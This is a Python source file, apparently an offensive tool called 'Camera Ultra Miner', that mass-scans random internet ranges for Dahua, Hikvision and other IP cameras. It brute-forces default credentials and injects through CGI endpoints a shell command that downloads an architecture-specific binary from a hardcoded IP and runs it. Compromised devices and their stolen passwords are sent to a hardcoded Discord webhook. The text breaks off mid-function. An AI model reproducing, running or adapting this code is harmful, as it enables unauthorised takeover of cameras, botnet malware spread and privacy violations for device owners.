#!/usr/bin/env python3
"""
CAMERA ULTRA MINER v2.0 - DETECCIÓN Y EXPLOTACIÓN DE CÁMARAS
Especializado en Dahua, Hikvision, CCTV y cámaras IP
"""

import socket
import time
import random
import threading
import requests
import sys
import json
import os
import base64
from datetime import datetime
import urllib.parse
import urllib.request
import urllib.error

# =============================================
# CONFIGURACIÓN
# =============================================
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1467370261618888984/DbciPM6YgUZsQBL7sUanfSKOd7pU-XOuKAA747SgoGmt78RdNlC_FncDjJU6sjo_-FjJ"
SCAN_DURATION = 300  # 5 minutos
MAX_THREADS = 500
OUTPUT_FILE = "cameras_hits.txt"
LOG_FILE = "camera_log.json"
PAYLOAD_FILE = "payload_executed.txt"

# =============================================
# PAYLOAD AUTO-INSTALADOR
# =============================================
PAYLOAD = """cd /tmp && a=$(uname -m); case $a in x86_64) b="x86_64";; i?86) b="x86";; armv7l) b="arm7";; armv6l) b="arm6";; armv5l) b="arm5";; aarch64) b="aarch64";; mips) b="mips";; mipsel) b="mipsel";; *) b="x86_64";; esac; wget -q http://172.96.140.62:1283/bins/$b -O .x && chmod +x .x && ./.x &"""

# =============================================
# CREDENCIALES DE CÁMARAS
# =============================================
CAMERA_CREDS = [
    # Dahua Defaults
    ("admin", ""),
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "admin1234"),
    ("admin", "admin12345"),
    ("admin", "admin123456"),
    ("admin", "admin123456789"),
    ("admin", "888888"),
    ("admin", "666666"),
    ("admin", "111111"),
    ("admin", "222222"),
    ("admin", "333333"),
    ("admin", "444444"),
    ("admin", "555555"),
    ("admin", "777777"),
    ("admin", "999999"),
    ("admin", "000000"),
    ("admin", "12345678"),
    ("admin", "123456789"),
    ("admin", "1234567890"),
    ("admin", "1234"),
    ("admin", "12345"),
    
    # Dahua Specific
    ("admin", "dahua"),
    ("admin", "Dahua"),
    ("admin", "DAHUA"),
    ("admin", "dahua123"),
    ("admin", "Dahua123"),
    ("admin", "dahua2021"),
    ("admin", "dahua2022"),
    ("admin", "dahua2023"),
    ("admin", "dahua2024"),
    ("admin", "dahua2025"),
    
    # Other Users
    ("supervisor", ""),
    ("supervisor", "supervisor"),
    ("supervisor", "123456"),
    ("supervisor", "password"),
    ("888888", "888888"),
    ("666666", "666666"),
    ("guest", ""),
    ("guest", "guest"),
    ("user", "user"),
    ("user", "123456"),
    ("root", "root"),
    ("root", "123456"),
    ("root", "admin"),
    ("operator", "operator"),
    ("operator", "123456"),
    
    # Hikvision
    ("admin", "12345"),
    ("admin", "hikvision"),
    ("admin", "Hikvision"),
    ("admin", "HIKVISION"),
    ("admin", "hik12345"),
    ("admin", "hik123456"),
    ("admin", "hikvision123"),
    ("admin", "Hikvision123"),
    
    # Generic
    ("camera", "camera"),
    ("camera", "123456"),
    ("security", "security"),
    ("security", "123456"),
    ("web", "web"),
    ("web", "123456"),
    ("ftp", "ftp"),
    ("ftp", "123456"),
    ("http", "http"),
    ("http", "123456"),
    ("https", "https"),
    ("https", "123456"),
    ("ipcam", "ipcam"),
    ("ipcam", "123456"),
    ("ipcamera", "ipcamera"),
    ("ipcamera", "123456"),
    ("cctv", "cctv"),
    ("cctv", "123456"),
    ("dvr", "dvr"),
    ("dvr", "123456"),
    ("nvr", "nvr"),
    ("nvr", "123456"),
    ("surveillance", "surveillance"),
    ("surveillance", "123456"),
    ("monitor", "monitor"),
    ("monitor", "123456"),
    ("view", "view"),
    ("view", "123456"),
    ("live", "live"),
    ("live", "123456"),
    ("record", "record"),
    ("record", "123456"),
    ("playback", "playback"),
    ("playback", "123456"),
    
    # Common Patterns
    ("", ""),  # Empty credentials
    ("admin", "adminadmin"),
    ("admin", "adminadminadmin"),
    ("admin", "admin!@#"),
    ("admin", "admin!@#$"),
    ("admin", "admin!@#$%"),
    ("admin", "admin!@#$%^"),
    ("admin", "admin!@#$%^&"),
    ("admin", "admin!@#$%^&*"),
    
    # Year Patterns
    ("admin", "2020"),
    ("admin", "2021"),
    ("admin", "2022"),
    ("admin", "2023"),
    ("admin", "2024"),
    ("admin", "2025"),
    ("admin", "2019"),
    ("admin", "2018"),
    ("admin", "2017"),
    ("admin", "2016"),
    ("admin", "2015"),
    ("admin", "2014"),
    ("admin", "2013"),
    ("admin", "2012"),
    ("admin", "2011"),
    ("admin", "2010"),
    
    # Sequential
    ("admin", "123"),
    ("admin", "321"),
    ("admin", "123123"),
    ("admin", "123321"),
    ("admin", "112233"),
    ("admin", "111222"),
    ("admin", "121212"),
    ("admin", "212121"),
]

# =============================================
# RANGOS IP ESPECÍFICOS PARA CÁMARAS
# =============================================
CAMERA_RANGES = [
    # Redes Privadas (Donde más cámaras hay)
    ("192.168.0.0", "192.168.255.255"),
    ("10.0.0.0", "10.255.255.255"),
    ("172.16.0.0", "172.31.255.255"),
    
    # Proveedores ISP comunes con cámaras
    ("177.0.0.0", "177.127.255.255"),  # Brasil
    ("179.0.0.0", "179.127.255.255"),  # Brasil
    ("187.0.0.0", "187.127.255.255"),  # Brasil
    ("189.0.0.0", "189.127.255.255"),  # Brasil
    ("200.0.0.0", "200.127.255.255"),  # México/LATAM
    ("201.0.0.0", "201.127.255.255"),  # México/LATAM
    
    # Rangos específicos de CCTV
    ("1.0.0.0", "1.63.255.255"),
    ("14.0.0.0", "14.63.255.255"),
    ("27.0.0.0", "27.63.255.255"),
    ("36.0.0.0", "36.63.255.255"),
    ("39.0.0.0", "39.63.255.255"),
    ("42.0.0.0", "42.63.255.255"),
    ("49.0.0.0", "49.63.255.255"),
    ("58.0.0.0", "58.63.255.255"),
    ("59.0.0.0", "59.63.255.255"),
    ("60.0.0.0", "60.63.255.255"),
    ("61.0.0.0", "61.63.255.255"),
    ("101.0.0.0", "101.63.255.255"),
    ("103.0.0.0", "103.63.255.255"),
    ("106.0.0.0", "106.63.255.255"),
    ("110.0.0.0", "110.63.255.255"),
    ("111.0.0.0", "111.63.255.255"),
    ("112.0.0.0", "112.63.255.255"),
    ("113.0.0.0", "113.63.255.255"),
    ("114.0.0.0", "114.63.255.255"),
    ("115.0.0.0", "115.63.255.255"),
    ("116.0.0.0", "116.63.255.255"),
    ("117.0.0.0", "117.63.255.255"),
    ("118.0.0.0", "118.63.255.255"),
    ("119.0.0.0", "119.63.255.255"),
    ("120.0.0.0", "120.63.255.255"),
    ("121.0.0.0", "121.63.255.255"),
    ("122.0.0.0", "122.63.255.255"),
    ("123.0.0.0", "123.63.255.255"),
    ("124.0.0.0", "124.63.255.255"),
    ("125.0.0.0", "125.63.255.255"),
    ("171.0.0.0", "171.63.255.255"),
    ("175.0.0.0", "175.63.255.255"),
    ("180.0.0.0", "180.63.255.255"),
    ("182.0.0.0", "182.63.255.255"),
    ("183.0.0.0", "183.63.255.255"),
    ("202.0.0.0", "202.63.255.255"),
    ("203.0.0.0", "203.63.255.255"),
    ("210.0.0.0", "210.63.255.255"),
    ("211.0.0.0", "211.63.255.255"),
    ("218.0.0.0", "218.63.255.255"),
    ("219.0.0.0", "219.63.255.255"),
    ("220.0.0.0", "220.63.255.255"),
    ("221.0.0.0", "221.63.255.255"),
    ("222.0.0.0", "222.63.255.255"),
    ("223.0.0.0", "223.63.255.255"),
]

# =============================================
# PUERTOS DE CÁMARAS
# =============================================
CAMERA_PORTS = [
    80,      # HTTP Web Interface
    81,      # Alternate HTTP
    82,      # Alternate HTTP
    83,      # Alternate HTTP
    84,      # Alternate HTTP
    85,      # Alternate HTTP
    86,      # Alternate HTTP
    87,      # Alternate HTTP
    88,      # Alternate HTTP
    89,      # Alternate HTTP
    8080,    # HTTP Alternate
    8081,    # HTTP Alternate
    8082,    # HTTP Alternate
    8083,    # HTTP Alternate
    8084,    # HTTP Alternate
    8085,    # HTTP Alternate
    8086,    # HTTP Alternate
    8087,    # HTTP Alternate
    8088,    # HTTP Alternate
    8089,    # HTTP Alternate
    8000,    # Common Camera Port
    8001,    # Common Camera Port
    8002,    # Common Camera Port
    8003,    # Common Camera Port
    8004,    # Common Camera Port
    8005,    # Common Camera Port
    8006,    # Common Camera Port
    8007,    # Common Camera Port
    8008,    # Common Camera Port
    8009,    # Common Camera Port
    37777,   # Dahua Default
    37778,   # Dahua Default
    37779,   # Dahua Default
    34567,   # Dahua Mobile
    34568,   # Dahua Mobile
    34569,   # Dahua Mobile
    34570,   # Dahua Mobile
    34571,   # Dahua Mobile
    34572,   # Dahua Mobile
    34573,   # Dahua Mobile
    34574,   # Dahua Mobile
    34575,   # Dahua Mobile
    34576,   # Dahua Mobile
    34577,   # Dahua Mobile
    34578,   # Dahua Mobile
    34579,   # Dahua Mobile
    34580,   # Dahua Mobile
    554,     # RTSP
    555,     # RTSP Alternate
    556,     # RTSP Alternate
    8554,    # RTSP Alternate
    8555,    # RTSP Alternate
    8556,    # RTSP Alternate
    1935,    # RTMP
    1936,    # RTMP Alternate
    7001,    # ONVIF
    7002,    # ONVIF Alternate
    8899,    # Dahua SDK
    9900,    # Dahua SDK
    9901,    # Dahua SDK
    9902,    # Dahua SDK
    9903,    # Dahua SDK
    9904,    # Dahua SDK
    9905,    # Dahua SDK
    9906,    # Dahua SDK
    9907,    # Dahua SDK
    9908,    # Dahua SDK
    9909,    # Dahua SDK
]

# =============================================
# PATHS DE CÁMARAS PARA DETECCIÓN
# =============================================
CAMERA_PATHS = [
    "/",  # Root path
    "/index.html",
    "/login.html",
    "/login.asp",
    "/login.php",
    "/login.jsp",
    "/login.cgi",
    "/login.htm",
    "/web/index.html",
    "/web/login.html",
    "/web/login.asp",
    "/web/login.php",
    "/web/login.jsp",
    "/web/login.cgi",
    "/web/login.htm",
    "/view/login.html",
    "/view/login.asp",
    "/view/login.php",
    "/view/login.jsp",
    "/view/login.cgi",
    "/view/login.htm",
    "/cgi-bin/login.cgi",
    "/cgi-bin/login.asp",
    "/cgi-bin/login.php",
    "/cgi-bin/login.jsp",
    "/cgi-bin/login.htm",
    "/admin/index.html",
    "/admin/login.html",
    "/admin/login.asp",
    "/admin/login.php",
    "/admin/login.jsp",
    "/admin/login.cgi",
    "/admin/login.htm",
    "/dahua/index.html",
    "/dahua/login.html",
    "/dahua/login.asp",
    "/dahua/login.php",
    "/dahua/login.jsp",
    "/dahua/login.cgi",
    "/dahua/login.htm",
    "/hikvision/index.html",
    "/hikvision/login.html",
    "/hikvision/login.asp",
    "/hikvision/login.php",
    "/hikvision/login.jsp",
    ("/hikvision/login.cgi", "/hikvision/login.htm"),
    "/cgi-bin/viewer/video.jpg",
    "/cgi-bin/snapshot.cgi",
    "/cgi-bin/snapshot.jpg",
    "/snapshot.jpg",
    "/snapshot.cgi",
    "/video.jpg",
    "/videostream.cgi",
    "/cgi-bin/videostream.cgi",
    "/img/snapshot.jpg",
    "/img/video.jpg",
    "/tmp/snapshot.jpg",
    "/tmp/video.jpg",
    "/media/snapshot.jpg",
    "/media/video.jpg",
    "/stream",
    "/live",
    "/video",
    "/mjpg",
    "/mjpg/video.mjpg",
    "/mjpg/stream.mjpg",
    "/video/mjpg",
    "/stream/mjpg",
    "/live/mjpg",
    "/api/camera",
    "/api/video",
    "/api/stream",
    "/api/live",
]

# =============================================
# EXPLOITS Y PAYLOADS PARA CÁMARAS
# =============================================
class CameraExploits:
    @staticmethod
    def dahua_rce(ip, port, username, password):
        """Exploit RCE para cámaras Dahua"""
        payloads = [
            # Payload 1: Ejecución de comando
            "/cgi-bin/magicBox.cgi?action=setSystemCommand&command=" + urllib.parse.quote(PAYLOAD),
            
            # Payload 2: Configuración
            "/cgi-bin/configManager.cgi?action=setConfig&VideoWidget%5B0%5D.TimeTitle.EncodeBlend=true&VideoWidget%5B0%5D.TimeTitle.Text=" + urllib.parse.quote(PAYLOAD),
            
            # Payload 3: RTSP config
            "/cgi-bin/configManager.cgi?action=setConfig&RTSP.UserDefineName=" + urllib.parse.quote(PAYLOAD),
            
            # Payload 4: Network config
            "/cgi-bin/configManager.cgi?action=setConfig&Network.ETH0.IPAddress=" + urllib.parse.quote(PAYLOAD),
        ]
        
        for payload in payloads:
            try:
                url = f"http://{ip}:{port}{payload}"
                headers = {
                    'User-Agent': 'Mozilla/5.0',
                    'Authorization': 'Basic ' + base64.b64encode(f"{username}:{password}".encode()).decode(),
                    'Accept': '*/*',
                    'Connection': 'close'
                }
                
                response = requests.get(url, headers=headers, timeout=5, verify=False)
                if response.status_code == 200:
                    return True, "Dahua RCE ejecutado"
            except:
                continue
        
        return False, "Fallo en explotación Dahua"
    
    @staticmethod
    def generic_rce(ip, port, username, password):
        """Exploit genérico para cámaras"""
        payloads = [
            # CGI command execution
            "/cgi-bin/command.cgi?cmd=" + urllib.parse.quote(PAYLOAD),
            
            # Shell execution
            "/cgi-bin/shell.cgi?command=" + urllib.parse.quote(PAYLOAD),
            
            # System command
            "/cgi-bin/system.cgi?cmd=" + urllib.parse.quote(PAYLOAD),
            
            # API command
            "/api/command?cmd=" + urllib.parse.quote(PAYLOAD),
            
            # Config injection
            "/cgi-bin/config.cgi?action=set&param=" + urllib.parse.quote(PAYLOAD),
        ]
        
        for payload in payloads:
            try:
                url = f"http://{ip}:{port}{payload}"
                headers = {
                    'User-Agent': 'Mozilla/5.0',
                    'Accept': '*/*',
                    'Connection': 'close'
                }
                
                if username or password:
                    headers['Authorization'] = 'Basic ' + base64.b64encode(f"{username}:{password}".encode()).decode()
                
                response = requests.get(url, headers=headers, timeout=5, verify=False)
                if response.status_code == 200:
                    return True, "RCE genérico ejecutado"
            except:
                continue
        
        return False, "Fallo en RCE genérico"
    
    @staticmethod
    def hikvision_rce(ip, port, username, password):
        """Exploit RCE para Hikvision"""
        payloads = [
            # Security hole
            "/Security/users?auth=YWRtaW46MTEK",
            
            # Backup config
            "/System/configurationFile?auth=YWRtaW46MTEK",
            
            # Log injection
            "/Log/backup?auth=YWRtaW46MTEK",
        ]
        
        for payload in payloads:
            try:
                url = f"http://{ip}:{port}{payload}"
                headers = {
                    'User-Agent': 'Mozilla/5.0',
                    'Accept': '*/*',
                    'Connection': 'close'
                }
                
                response = requests.get(url, headers=headers, timeout=5, verify=False)
                if response.status_code == 200:
                    # Intentar ejecutar payload
                    exec_url = f"http://{ip}:{port}/cgi-bin/ptz.cgi?action=start&channel=1&code=GotoPreset&arg1=1&arg2=" + urllib.parse.quote(PAYLOAD)
                    requests.get(exec_url, headers=headers, timeout=3, verify=False)
                    return True, "Hikvision RCE ejecutado"
            except:
                continue
        
        return False, "Fallo en explotación Hikvision"

# =============================================
# CLASE CAMERA MINER
# =============================================
class CameraMiner:
    def __init__(self):
        self.running = True
        self.start_time = time.time()
        self.hits = []
        self.stats = {
            'scanned': 0,
            'open_ports': 0,
            'web_interfaces': 0,
            'login_success': 0,
            'exploited': 0,
            'failed': 0,
            'speed': 0
        }
        self.lock = threading.Lock()
        
        # Inicializar archivos
        self.init_files()
        
        print(f"[📹] Camera Miner iniciado - {len(CAMERA_CREDS)} credenciales")
        print(f"[⚡] Payload listo para ejecución automática")
    
    def init_files(self):
        """Inicializar archivos de salida"""
        # Archivo de hits
        with open(OUTPUT_FILE, 'w') as f:
            f.write(f"# CAMERA HITS - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("# Formato: IP:PORT:TYPE:USER:PASSWORD:EXPLOIT_STATUS\n\n")
        
        # Archivo de payloads ejecutados
        with open(PAYLOAD_FILE, 'w') as f:
            f.write(f"# PAYLOADS EJECUTADOS - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("# Payload usado:\n")
            f.write(f"# {PAYLOAD}\n\n")
        
        # Archivo JSON para logs
        with open(LOG_FILE, 'w') as f:
            json.dump({
                'start_time': datetime.now().isoformat(),
                'duration': SCAN_DURATION,
                'payload': PAYLOAD,
                'hits': []
            }, f, indent=2)
    
    def generate_random_ip(self):
        """Generar IP aleatoria de rangos de cámaras"""
        start_range, end_range = random.choice(CAMERA_RANGES)
        start = list(map(int, start_range.split('.')))
        end = list(map(int, end_range.split('.')))  # CORREGIDO: list(map(...))
        
        ip_parts = []
        for i in range(4):
            ip_parts.append(str(random.randint(start[i], end[i])))
        
        return ".".join(ip_parts)
    
    def check_port_fast(self, ip, port, timeout=0.2):
        """Verificación ultra rápida de puerto"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            sock.close()
            return False
    
    def detect_camera_type(self, ip, port):
        """Detectar tipo de cámara"""
        detection_paths = [
            ("/", "Generic Web"),
            ("/index.html", "Generic Web"),
            ("/login.html", "Generic Login"),
            ("/cgi-bin/magicBox.cgi", "Dahua"),
            ("/cgi-bin/configManager.cgi", "Dahua"),
            ("/cgi-bin/guest/Image/channels", "Hikvision"),
            ("/System/configurationFile", "Hikvision"),
            ("/cgi-bin/viewer/video.jpg", "Generic Camera"),
            ("/snapshot.jpg", "Generic Camera"),
            ("/videostream.cgi", "Generic Camera"),
            ("/img/snapshot.jpg", "Generic Camera"),
            ("/api/camera", "API Camera"),
            ("/stream", "Streaming Camera"),
        ]
        
        for path, camera_type in detection_paths:
            try:
                url = f"http://{ip}:{port}{path}"
                response = requests.get(url, timeout=2, verify=False)
                
                if response.status_code == 200:
                    # Verificar contenido para confirmar
                    if "dahua" in response.text.lower():
                        return "Dahua"
                    elif "hikvision" in response.text.lower():
                        return "Hikvision"
                    elif "camera" in response.text.lower() or "ipcam" in response.text.lower():
                        return "Generic IP Camera"
                    elif "video" in response.text.lower() or "stream" in response.text.lower():
                        return "Streaming Device"
                    else:
                        return camera_type
            except:
                continue
        
        return "Unknown"
    
    def try_camera_login(self, ip, port, username, password):
        """Intentar login en cámara"""
        login_urls = [
            f"http://{ip}:{port}/",
            f"http://{ip}:{port}/login.html",
            f"http://{ip}:{port}/login.asp",
            f"http://{ip}:{port}/login.php",
            f"http://{ip}:{port}/login.cgi",
            f"http://{ip}:{port}/web/login.html",
            f"http://{ip}:{port}/view/login.html",
            f"http://{ip}:{port}/dahua/login.html",
            f"http://{ip}:{port}/cgi-bin/login.cgi",
        ]
        
        for url in login_urls:
            try:
                # Intentar con Basic Auth primero
                headers = {
                    'User-Agent': 'Mozilla/5.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Authorization': 'Basic ' + base64.b64encode(f"{username}:{password}".encode()).decode()
                }
                
                response = requests.get(url, headers=headers, timeout=3, verify=False)
                
                # Verificar si el login fue exitoso
                if response.status_code == 200:
                    # Buscar indicadores de éxito
                    if "logout" in response.text.lower() or "sign out" in response.text.lower():
                        return True, "Basic Auth"
                    elif "main" in response.text.lower() or "dashboard" in response.text.lower():
                        return True, "Basic Auth"
                    elif response.status_code != 401:  # No es unauthorized
                        return True, "Possible Access"
                
                # Intentar con POST si hay formulario
                if "form" in response.text.lower() and "password" in response.text.lower():
                    # Extraer campos del formulario
                    soup = BeautifulSoup(response.text, 'html.parser')
                    form = soup.find('form')
                    
                    if form:
                        form_data = {}
                        action = form.get('action', '')
                        method = form.get('method', 'post').lower()
                        
                        for input_tag in form.find_all('input'):
                            name = input_tag.get('name')
                            value = input_tag.get('value', '')
                            if name:
                                if "user" in name.lower() or "name" in name.lower():
                                    form_data[name] = username
                                elif "pass" in name.lower():
                                    form_data[name] = password
                                else:
                                    form_data[name] = value
                        
                        # Enviar formulario
                        if method == 'post':
                            login_response = requests.post(
                                f"http://{ip}:{port}{action}",
                                data=form_data,
                                timeout=3,
                                verify=False
                            )
                            
                            if login_response.status_code == 200:
                                if "logout" in login_response.text.lower():
                                    return True, "Form Login"
            
            except Exception as e:
                continue
        
        return False, "Failed"
    
    def execute_payload(self, ip, port, username, password, camera_type):
        """Ejecutar payload en la cámara"""
        exploits = CameraExploits()
        
        if "dahua" in camera_type.lower():
            success, message = exploits.dahua_rce(ip, port, username, password)
        elif "hikvision" in camera_type.lower():
            success, message = exploits.hikvision_rce(ip, port, username, password)
        else:
            success, message = exploits.generic_rce(ip, port, username, password)
        
        return success, message
    
    def process_camera(self, ip):
        """Procesar una cámara IP"""
        if not self.running:
            return
        
        # Probar puertos de cámaras
        for port in CAMERA_PORTS[:30]:  # Solo primeros 30 para velocidad
            if not self.running:
                return
            
            # Verificación rápida de puerto
            if self.check_port_fast(ip, port, timeout=0.15):
                with self.lock:
                    self.stats['open_ports'] += 1
                
                # Detectar tipo de cámara
                camera_type = self.detect_camera_type(ip, port)
                
                if camera_type != "Unknown":
                    with self.lock:
                        self.stats['web_interfaces'] += 1
                    
                    print(f"[📹] {ip}:{port} - {camera_type} detectada")
                    
                    # Intentar credenciales
                    for username, password in CAMERA_CREDS[:50]:  # Top 50 creds
                        if not self.running:
                            return
                        
                        success, login_method = self.try_camera_login(ip, port, username, password)
                        
                        if success:
                            with self.lock:
                                self.stats['login_success'] += 1
                            
                            print(f"[✅] Login: {ip}:{port} - {username}:{password}")
                            
                            # Intentar ejecutar payload
                            exploit_success, exploit_message = self.execute_payload(ip, port, username, password, camera_type)
                            
                            if exploit_success:
                                with self.lock:
                                    self.stats['exploited'] += 1
                                
                                print(f"[💀] PAYLOAD EJECUTADO: {ip}:{port}")
                                
                                # Guardar hit
                                hit_data = {
                                    'ip': ip,
                                    'port': port,
                                    'type': camera_type,
                                    'username': username or 'none',
                                    'password': password or 'empty',
                                    'login_method': login_method,
                                    'exploit_status': 'SUCCESS',
                                    'exploit_message': exploit_message,
                                    'payload': PAYLOAD,
                                    'timestamp': datetime.now().isoformat()
                                }
                                
                                with self.lock:
                                    self.hits.append(hit_data)
                                
                                self.save_hit(hit_data)
                                self.send_to_discord(hit_data)
                                
                                break  # Pasar a siguiente IP
                            
                            else:
                                # Login exitoso pero exploit falló
                                hit_data = {
                                    'ip': ip,
                                    'port': port,
                                    'type': camera_type,
                                    'username': username,
                                    'password': password,
                                    'login_method': login_method,
                                    'exploit_status': 'FAILED',
                                    'exploit_message': exploit_message,
                                    'timestamp': datetime.now().isoformat()
                                }
                                
                                with self.lock:
                                    self.hits.append(hit_data)
                                
                                self.save_hit(hit_data)
                                break
        
        with self.lock:
            self.stats['scanned'] += 1
    
    def save_hit(self, hit_data):
        """Guardar hit en archivos"""
        # Archivo principal
        txt_line = f"{hit_data['ip']}:{hit_data['port']}:{hit_data['type']}:{hit_data['username']}:{hit_data['password']}:{hit_data.get('exploit_status', 'N/A')}\n"
        
        with self.lock:
            with open(OUTPUT_FILE, 'a') as f:
                f.write(txt_line)
            
            # Archivo de payloads ejecutados
            if hit_data.get('exploit_status') == 'SUCCESS':
                with open(PAYLOAD_FILE, 'a') as f:
                    f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {hit_data['ip']}:{hit_data['port']} - {hit_data['type']}\n")
                    f.write(f"  Usuario: {hit_data['username']}:{hit_data['password']}\n")
                    f.write(f"  Payload: {hit_data.get('payload', 'N/A')}\n")
                    f.write(f"  Mensaje: {hit_data.get('exploit_message', 'N/A')}\n\n")
            
            # Actualizar JSON
            try:
                with open(LOG_FILE, 'r') as f:
                    data = json.load(f)
            except:
                data = {'hits': []}
            
            data['hits'].append(hit_data)
            
            with open(LOG_FILE, 'w') as f:
                json.dump(data, f, indent=2)
    
    def send_to_discord(self, hit_data):
        """Enviar hit a Discord"""
        if not DISCORD_WEBHOOK_URL or "YOUR_WEBHOOK" in DISCORD_WEBHOOK_URL:
            return
        
        color = 0x00ff00 if hit_data.get('exploit_status') == 'SUCCESS' else 0xff9900
        
        embed = {
            "title": "📹 NUEVA CÁMARA COMPROMETIDA" if hit_data.get('exploit_status') == 'SUCCESS' else "⚠️ CÁMARA DETECTADA",
            "color": color,
            "fields": [
                {"name": "IP", "value": f"`{hit_data['ip']}`", "inline": True},
                {"name": "Puerto", "value": f"`{hit_data['port']}`", "inline": True},
                {"name": "Tipo", "value": hit_data['type'], "inline": True},
                {"name": "Usuario", "value": f"`{hit_data['username']}`", "inline": True},
                {"name": "Contraseña", "value": f"`{hit_data['password']}`", "inline": True},
                {"name": "Estado", "value": hit_data.get('exploit_status', 'N/A'), "inline": True},
                {"name": "Método", "value": hit_data.get('login_method', 'N/A'), "inline": True},
                {"name": "Mensaje", "value": hit_data.get('exploit_message', 'N/A'), "inline": True},
                {"name": "Hora", "value": hit_data['timestamp'][11:19], "inline": True}
            ],
            "footer": {
                "text": f"Camera Miner • Exploited: {self.stats['exploited']}"
            }
        }
        
        payload = {
            "embeds": [embed],
            "username": "Camera Miner Bot",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/2991/2991148.png"
        }
        
        try:
            requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=2)
        except:
            pass
    
    def show_stats(self):
        """Mostrar estadísticas en tiempo real"""
        elapsed = time.time() - self.start_time
        remaining = max(0, SCAN_DURATION - elapsed)
        
        with self.lock:
            scanned = self.stats['scanned']
            open_ports = self.stats['open_ports']
            web_interfaces = self.stats['web_interfaces']
            login_success = self.stats['login_success']
            exploited = self.stats['exploited']
        
        if elapsed > 0:
            speed = scanned / elapsed
        else:
            speed = 0
        
        os.system('clear' if os.name == 'posix' else 'cls')
        
        stats_text = f"""
{'='*80}
╔══════════════════════════════════════════════════════════════════════════════╗
║                    CAMERA ULTRA MINER v2.0                                   ║
║                    =======================                                   ║
║  📹  Minería de Cámaras IP • Dahua/Hikvision • Auto-Exploit • Payload       ║
║  ⚡  Auto-detección y explotación                                            ║
║  💀  Payload auto-ejecutable incluido                                       ║
║  🔥  {MAX_THREADS} threads de escaneo rápido                               ║
║  📡  Envío a Discord automático                                             ║
║  💾  Guardado en {OUTPUT_FILE:<25}         ║
╚══════════════════════════════════════════════════════════════════════════════╝
{'='*80}

[⏱️]  Tiempo: {elapsed:.0f}s / {SCAN_DURATION}s ({remaining:.0f}s restantes)
[🔍]  IPs Escaneadas: {scanned:,}
[🔓]  Puertos Abiertos: {open_ports:,}
[🌐]  Interfaces Web: {web_interfaces:,}
[🔑]  Logins Exitosos: {login_success:,}
[💀]  Cámaras Explotadas: {exploited:,}
[⚡]  Velocidad: {speed:.1f} IPs/segundo
[📊]  Tasa Exploit: {(exploited/max(1, web_interfaces)*100):.1f}%
[💾]  Archivo: {OUTPUT_FILE}
[📁]  Payloads: {PAYLOAD_FILE}

{'='*80}

[🔥] ÚLTIMOS 3 HITS:
"""
        
        print(stats_text)
        
        if self.hits:
            for i, hit in enumerate(self.hits[-3:], 1):
                status = "✅" if hit.get('exploit_status') == 'SUCCESS' else "⚠️"
                print(f"  {i}. {status} {hit['ip']}:{hit['port']} - {hit['type']} - {hit['username']}:{hit['password']}")
        else:
            print("  [🔄] Escaneando...")
        
        print(f"\n[⚡] Payload activo: {PAYLOAD[:50]}...")
        print(f"[👥] Threads activos: {threading.active_count() - 1}")
        print('='*80)
    
    def worker(self, worker_id):
        """Worker de minería"""
        while self.running and (time.time() - self.start_time) < SCAN_DURATION:
            ip = self.generate_random_ip()
            self.process_camera(ip)
            
            # Pausa mínima
            time.sleep(0.001)
    
    def start_mining(self, threads=MAX_THREADS):
        """Iniciar minería de cámaras"""
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║               CAMERA ULTRA MINER v2.0                        ║
║               =========================                       ║
║  📹  Especializado en Dahua/Hikvision/IP Cameras            ║
║  ⚡  Auto-detección y explotación                            ║
║  💀  Payload auto-ejecutable incluido                       ║
║  🔥  {threads} threads de escaneo rápido                   ║
║  📡  Envío a Discord automático                             ║
║  💾  Guardado en {OUTPUT_FILE:<25} ║
╚══════════════════════════════════════════════════════════════╝
""")
        
        print(f"[⚡] Iniciando minería de cámaras en 3 segundos...")
        time.sleep(3)
        
        # Crear threads
        workers = []
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(i+1,))
            t.daemon = True
            t.start()
            workers.append(t)
        
        print(f"[✅] {len(workers)} workers activos")
        print("[🔥] MINANDO CÁMARAS Y EJECUTANDO PAYLOAD...\n")
        
        # Loop principal
        stats_counter = 0
        try:
            while self.running and (time.time() - self.start_time) < SCAN_DURATION:
                time.sleep(3)
                
                self.show_stats()
                stats_counter += 1
                
                if stats_counter % 10 == 0:
                    self.send_stats_to_discord()
                
        except KeyboardInterrupt:
            print("\n[!] Minería interrumpida por usuario")
            self.running = False
        
        # Finalizar
        self.running = False
        
        for t in workers:
            t.join(timeout=1)
        
        # Resultados finales
        print("\n" + "="*80)
        print("[🏁] MINERÍA DE CÁMARAS FINALIZADA")
        print("="*80)
        self.show_final_results()
    
    def send_stats_to_discord(self):
        """Enviar estadísticas a Discord"""
        if not DISCORD_WEBHOOK_URL or "YOUR_WEBHOOK" in DISCORD_WEBHOOK_URL:
            return
        
        elapsed = time.time() - self.start_time
        
        with self.lock:
            scanned = self.stats['scanned']
            web_interfaces = self.stats['web_interfaces']
            exploited = self.stats['exploited']
        
        embed = {
            "title": "📊 CAMERA MINER - ESTADÍSTICAS",
            "color": 0x3498db,
            "fields": [
                {"name": "IPs Escaneadas", "value": f"{scanned:,}", "inline": True},
                {"name": "Cámaras Detectadas", "value": f"{web_interfaces:,}", "inline": True},
                {"name": "Cámaras Explotadas", "value": f"{exploited:,}", "inline": True},
                {"name": "Tasa de Éxito", "value": f"{(exploited/max(1, web_interfaces)*100):.1f}%", "inline": True},
                {"name": "Tiempo", "value": f"{elapsed:.0f}s", "inline": True},
                {"name": "Velocidad", "value": f"{scanned/elapsed:.1f} IPs/s", "inline": True}
            ],
            "footer": {
                "text": f"Actualizado • {datetime.now().strftime('%H:%M:%S')}"
            }
        }
        
        payload = {"embeds": [embed]}
        
        try:
